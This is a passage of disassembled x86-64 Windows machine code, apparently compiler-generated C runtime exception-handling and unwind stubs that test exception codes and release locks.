   14000fa8b:	48 89 4d 48          	mov    %rcx,0x48(%rbp)
   14000fa8f:	e8 78 2b ff ff       	call   0x14000260c
   14000fa94:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   14000fa9b:	48 89 48 70          	mov    %rcx,0x70(%rax)
   14000fa9f:	48 8b bd 98 00 00 00 	mov    0x98(%rbp),%rdi
   14000faa6:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   14000faaa:	e8 5d 2b ff ff       	call   0x14000260c
   14000faaf:	48 89 58 60          	mov    %rbx,0x60(%rax)
   14000fab3:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000fab7:	48 8b 08             	mov    (%rax),%rcx
   14000faba:	48 8b 59 38          	mov    0x38(%rcx),%rbx
   14000fabe:	e8 49 2b ff ff       	call   0x14000260c
   14000fac3:	48 89 58 68          	mov    %rbx,0x68(%rax)
   14000fac7:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   14000facb:	c6 44 24 38 01       	movb   $0x1,0x38(%rsp)
   14000fad0:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000fad6:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000fadb:	48 8b 85 a0 00 00 00 	mov    0xa0(%rbp),%rax
   14000fae2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000fae7:	4c 8b cf             	mov    %rdi,%r9
   14000faea:	4c 8b 85 90 00 00 00 	mov    0x90(%rbp),%r8
   14000faf1:	48 8b 95 88 00 00 00 	mov    0x88(%rbp),%rdx
   14000faf8:	48 8b 09             	mov    (%rcx),%rcx
   14000fafb:	e8 d8 44 ff ff       	call   0x140003fd8
   14000fb00:	e8 07 2b ff ff       	call   0x14000260c
   14000fb05:	48 83 60 70 00       	andq   $0x0,0x70(%rax)
   14000fb0a:	c7 45 40 01 00 00 00 	movl   $0x1,0x40(%rbp)
   14000fb11:	c7 45 44 01 00 00 00 	movl   $0x1,0x44(%rbp)
   14000fb18:	8b 45 44             	mov    0x44(%rbp),%eax
   14000fb1b:	48 83 c4 40          	add    $0x40,%rsp
   14000fb1f:	5f                   	pop    %rdi
   14000fb20:	5d                   	pop    %rbp
   14000fb21:	5b                   	pop    %rbx
   14000fb22:	c3                   	ret
   14000fb23:	cc                   	int3
   14000fb24:	40 55                	rex push %rbp
   14000fb26:	48 83 ec 20          	sub    $0x20,%rsp
   14000fb2a:	48 8b ea             	mov    %rdx,%rbp
   14000fb2d:	48 89 4d 58          	mov    %rcx,0x58(%rbp)
   14000fb31:	4c 8d 45 20          	lea    0x20(%rbp),%r8
   14000fb35:	48 8b 95 b8 00 00 00 	mov    0xb8(%rbp),%rdx
   14000fb3c:	e8 73 47 ff ff       	call   0x1400042b4
   14000fb41:	90                   	nop
   14000fb42:	48 83 c4 20          	add    $0x20,%rsp
   14000fb46:	5d                   	pop    %rbp
   14000fb47:	c3                   	ret
   14000fb48:	cc                   	int3
   14000fb49:	40 53                	rex push %rbx
   14000fb4b:	55                   	push   %rbp
   14000fb4c:	48 83 ec 28          	sub    $0x28,%rsp
   14000fb50:	48 8b ea             	mov    %rdx,%rbp
   14000fb53:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   14000fb57:	e8 e4 33 ff ff       	call   0x140002f40
   14000fb5c:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   14000fb60:	75 48                	jne    0x14000fbaa
   14000fb62:	48 8b 9d b8 00 00 00 	mov    0xb8(%rbp),%rbx
   14000fb69:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   14000fb6f:	75 39                	jne    0x14000fbaa
   14000fb71:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   14000fb75:	75 33                	jne    0x14000fbaa
   14000fb77:	81 7b 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rbx)
   14000fb7e:	74 12                	je     0x14000fb92
   14000fb80:	81 7b 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rbx)
   14000fb87:	74 09                	je     0x14000fb92
   14000fb89:	81 7b 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rbx)
   14000fb90:	75 18                	jne    0x14000fbaa
   14000fb92:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000fb96:	e8 bd 28 ff ff       	call   0x140002458
   14000fb9b:	85 c0                	test   %eax,%eax
   14000fb9d:	74 0b                	je     0x14000fbaa
   14000fb9f:	b2 01                	mov    $0x1,%dl
   14000fba1:	48 8b cb             	mov    %rbx,%rcx
   14000fba4:	e8 3b 28 ff ff       	call   0x1400023e4
   14000fba9:	90                   	nop
   14000fbaa:	e8 5d 2a ff ff       	call   0x14000260c
   14000fbaf:	48 8b 8d c0 00 00 00 	mov    0xc0(%rbp),%rcx
   14000fbb6:	48 89 48 20          	mov    %rcx,0x20(%rax)
   14000fbba:	e8 4d 2a ff ff       	call   0x14000260c
   14000fbbf:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   14000fbc3:	48 89 48 28          	mov    %rcx,0x28(%rax)
   14000fbc7:	48 83 c4 28          	add    $0x28,%rsp
   14000fbcb:	5d                   	pop    %rbp
   14000fbcc:	5b                   	pop    %rbx
   14000fbcd:	c3                   	ret
   14000fbce:	cc                   	int3
   14000fbcf:	40 55                	rex push %rbp
   14000fbd1:	48 83 ec 20          	sub    $0x20,%rsp
   14000fbd5:	48 8b ea             	mov    %rdx,%rbp
   14000fbd8:	e8 cf 28 ff ff       	call   0x1400024ac
   14000fbdd:	90                   	nop
   14000fbde:	48 83 c4 20          	add    $0x20,%rsp
   14000fbe2:	5d                   	pop    %rbp
   14000fbe3:	c3                   	ret
   14000fbe4:	cc                   	int3
   14000fbe5:	40 55                	rex push %rbp
   14000fbe7:	48 83 ec 20          	sub    $0x20,%rsp
   14000fbeb:	48 8b ea             	mov    %rdx,%rbp
   14000fbee:	e8 19 2a ff ff       	call   0x14000260c
   14000fbf3:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   14000fbf7:	7e 08                	jle    0x14000fc01
   14000fbf9:	e8 0e 2a ff ff       	call   0x14000260c
   14000fbfe:	ff 48 30             	decl   0x30(%rax)
   14000fc01:	48 83 c4 20          	add    $0x20,%rsp
   14000fc05:	5d                   	pop    %rbp
   14000fc06:	c3                   	ret
   14000fc07:	cc                   	int3
   14000fc08:	40 55                	rex push %rbp
   14000fc0a:	48 83 ec 20          	sub    $0x20,%rsp
   14000fc0e:	48 8b ea             	mov    %rdx,%rbp
   14000fc11:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000fc15:	8b 08                	mov    (%rax),%ecx
   14000fc17:	48 83 c4 20          	add    $0x20,%rsp
   14000fc1b:	5d                   	pop    %rbp
   14000fc1c:	e9 9f 90 ff ff       	jmp    0x140008cc0
   14000fc21:	cc                   	int3
   14000fc22:	40 55                	rex push %rbp
   14000fc24:	48 83 ec 20          	sub    $0x20,%rsp
   14000fc28:	48 8b ea             	mov    %rdx,%rbp
   14000fc2b:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   14000fc2f:	48 8b 01             	mov    (%rcx),%rax
   14000fc32:	8b 08                	mov    (%rax),%ecx
   14000fc34:	89 4d 24             	mov    %ecx,0x24(%rbp)
   14000fc37:	33 c0                	xor    %eax,%eax
   14000fc39:	81 f9 63 73 6d e0    	cmp    $0xe06d7363,%ecx
   14000fc3f:	0f 94 c0             	sete   %al
   14000fc42:	89 45 20             	mov    %eax,0x20(%rbp)
   14000fc45:	8b 45 20             	mov    0x20(%rbp),%eax
   14000fc48:	48 83 c4 20          	add    $0x20,%rsp
   14000fc4c:	5d                   	pop    %rbp
   14000fc4d:	c3                   	ret
   14000fc4e:	cc                   	int3
   14000fc4f:	40 55                	rex push %rbp
   14000fc51:	48 83 ec 20          	sub    $0x20,%rsp
   14000fc55:	48 8b ea             	mov    %rdx,%rbp
   14000fc58:	48 8b 45 58          	mov    0x58(%rbp),%rax
   14000fc5c:	8b 08                	mov    (%rax),%ecx
   14000fc5e:	48 83 c4 20          	add    $0x20,%rsp
   14000fc62:	5d                   	pop    %rbp
   14000fc63:	e9 58 90 ff ff       	jmp    0x140008cc0
   14000fc68:	cc                   	int3
   14000fc69:	40 55                	rex push %rbp
   14000fc6b:	48 83 ec 20          	sub    $0x20,%rsp
   14000fc6f:	48 8b ea             	mov    %rdx,%rbp
   14000fc72:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000fc76:	8b 08                	mov    (%rax),%ecx
   14000fc78:	48 83 c4 20          	add    $0x20,%rsp
   14000fc7c:	5d                   	pop    %rbp
   14000fc7d:	e9 3e 90 ff ff       	jmp    0x140008cc0
   14000fc82:	cc                   	int3
   14000fc83:	40 55                	rex push %rbp
   14000fc85:	48 83 ec 20          	sub    $0x20,%rsp
   14000fc89:	48 8b ea             	mov    %rdx,%rbp
   14000fc8c:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000fc91:	48 83 c4 20          	add    $0x20,%rsp
   14000fc95:	5d                   	pop    %rbp
   14000fc96:	e9 25 90 ff ff       	jmp    0x140008cc0
   14000fc9b:	cc                   	int3
   14000fc9c:	40 55                	rex push %rbp
   14000fc9e:	48 83 ec 20          	sub    $0x20,%rsp
   14000fca2:	48 8b ea             	mov    %rdx,%rbp
   14000fca5:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000fcaa:	48 83 c4 20          	add    $0x20,%rsp
   14000fcae:	5d                   	pop    %rbp
   14000fcaf:	e9 0c 90 ff ff       	jmp    0x140008cc0
   14000fcb4:	cc                   	int3
   14000fcb5:	40 55                	rex push %rbp
   14000fcb7:	48 83 ec 20          	sub    $0x20,%rsp
   14000fcbb:	48 8b ea             	mov    %rdx,%rbp
   14000fcbe:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000fcc3:	48 83 c4 20          	add    $0x20,%rsp
   14000fcc7:	5d                   	pop    %rbp
   14000fcc8:	e9 f3 8f ff ff       	jmp    0x140008cc0
   14000fccd:	cc                   	int3
   14000fcce:	40 55                	rex push %rbp
   14000fcd0:	48 83 ec 20          	sub    $0x20,%rsp
   14000fcd4:	48 8b ea             	mov    %rdx,%rbp
   14000fcd7:	33 c9                	xor    %ecx,%ecx
   14000fcd9:	48 83 c4 20          	add    $0x20,%rsp
   14000fcdd:	5d                   	pop    %rbp
   14000fcde:	e9 dd 8f ff ff       	jmp    0x140008cc0
   14000fce3:	cc                   	int3
   14000fce4:	40 55                	rex push %rbp
   14000fce6:	48 83 ec 20          	sub    $0x20,%rsp
   14000fcea:	48 8b ea             	mov    %rdx,%rbp
   14000fced:	80 7d 70 00          	cmpb   $0x0,0x70(%rbp)
   14000fcf1:	74 0b                	je     0x14000fcfe
   14000fcf3:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000fcf8:	e8 c3 8f ff ff       	call   0x140008cc0
   14000fcfd:	90                   	nop
   14000fcfe:	48 83 c4 20          	add    $0x20,%rsp
   14000fd02:	5d                   	pop    %rbp
   14000fd03:	c3                   	ret
   14000fd04:	cc                   	int3
   14000fd05:	40 55                	rex push %rbp
   14000fd07:	48 83 ec 20          	sub    $0x20,%rsp
   14000fd0b:	48 8b ea             	mov    %rdx,%rbp
   14000fd0e:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   14000fd12:	48 8b 09             	mov    (%rcx),%rcx
   14000fd15:	48 83 c4 20          	add    $0x20,%rsp
   14000fd19:	5d                   	pop    %rbp
   14000fd1a:	e9 0d ae ff ff       	jmp    0x14000ab2c
   14000fd1f:	cc                   	int3
   14000fd20:	40 55                	rex push %rbp
   14000fd22:	48 83 ec 20          	sub    $0x20,%rsp
   14000fd26:	48 8b ea             	mov    %rdx,%rbp
   14000fd29:	48 8b 85 98 00 00 00 	mov    0x98(%rbp),%rax
   14000fd30:	8b 08                	mov    (%rax),%ecx
   14000fd32:	48 83 c4 20          	add    $0x20,%rsp
   14000fd36:	5d                   	pop    %rbp
   14000fd37:	e9 84 8f ff ff       	jmp    0x140008cc0
   14000fd3c:	cc                   	int3
   14000fd3d:	40 55                	rex push %rbp
   14000fd3f:	48 83 ec 20          	sub    $0x20,%rsp
   14000fd43:	48 8b ea             	mov    %rdx,%rbp
   14000fd46:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000fd4a:	8b 08                	mov    (%rax),%ecx
   14000fd4c:	48 83 c4 20          	add    $0x20,%rsp
   14000fd50:	5d                   	pop    %rbp
   14000fd51:	e9 b2 91 ff ff       	jmp    0x140008f08
   14000fd56:	cc                   	int3
   14000fd57:	40 55                	rex push %rbp
   14000fd59:	48 83 ec 30          	sub    $0x30,%rsp
   14000fd5d:	48 8b ea             	mov    %rdx,%rbp
   14000fd60:	8b 4d 60             	mov    0x60(%rbp),%ecx
   14000fd63:	48 83 c4 30          	add    $0x30,%rsp
   14000fd67:	5d                   	pop    %rbp
   14000fd68:	e9 9b 91 ff ff       	jmp    0x140008f08
   14000fd6d:	cc                   	int3
   14000fd6e:	40 55                	rex push %rbp
   14000fd70:	48 83 ec 20          	sub    $0x20,%rsp
   14000fd74:	48 8b ea             	mov    %rdx,%rbp
   14000fd77:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000fd7c:	48 83 c4 20          	add    $0x20,%rsp
   14000fd80:	5d                   	pop    %rbp
   14000fd81:	e9 3a 8f ff ff       	jmp    0x140008cc0
   14000fd86:	cc                   	int3
   14000fd87:	40 55                	rex push %rbp
   14000fd89:	48 83 ec 30          	sub    $0x30,%rsp
   14000fd8d:	48 8b ea             	mov    %rdx,%rbp
   14000fd90:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   14000fd94:	48 83 c4 30          	add    $0x30,%rsp
   14000fd98:	5d                   	pop    %rbp
   14000fd99:	e9 8e ad ff ff       	jmp    0x14000ab2c
   14000fd9e:	cc                   	int3
   14000fd9f:	40 55                	rex push %rbp
   14000fda1:	48 83 ec 20          	sub    $0x20,%rsp
   14000fda5:	48 8b ea             	mov    %rdx,%rbp
   14000fda8:	48 8b 01             	mov    (%rcx),%rax
   14000fdab:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000fdb1:	74 0c                	je     0x14000fdbf
   14000fdb3:	81 38 1d 00 00 c0    	cmpl   $0xc000001d,(%rax)
   14000fdb9:	74 04                	je     0x14000fdbf
   14000fdbb:	33 c0                	xor    %eax,%eax
   14000fdbd:	eb 05                	jmp    0x14000fdc4
   14000fdbf:	b8 01 00 00 00       	mov    $0x1,%eax
   14000fdc4:	48 83 c4 20          	add    $0x20,%rsp
   14000fdc8:	5d                   	pop    %rbp
   14000fdc9:	c3                   	ret
   14000fdca:	cc                   	int3
   14000fdcb:	cc                   	int3
   14000fdcc:	cc                   	int3
   14000fdcd:	cc                   	int3
   14000fdce:	cc                   	int3
   14000fdcf:	cc                   	int3
   14000fdd0:	40 55                	rex push %rbp
   14000fdd2:	48 83 ec 20          	sub    $0x20,%rsp
   14000fdd6:	48 8b ea             	mov    %rdx,%rbp
   14000fdd9:	48 8b 01             	mov    (%rcx),%rax
   14000fddc:	33 c9                	xor    %ecx,%ecx
   14000fdde:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000fde4:	0f 94 c1             	sete   %cl
   14000fde7:	8b c1                	mov    %ecx,%eax
   14000fde9:	48 83 c4 20          	add    $0x20,%rsp
   14000fded:	5d                   	pop    %rbp
   14000fdee:	c3                   	ret
   14000fdef:	cc                   	int3
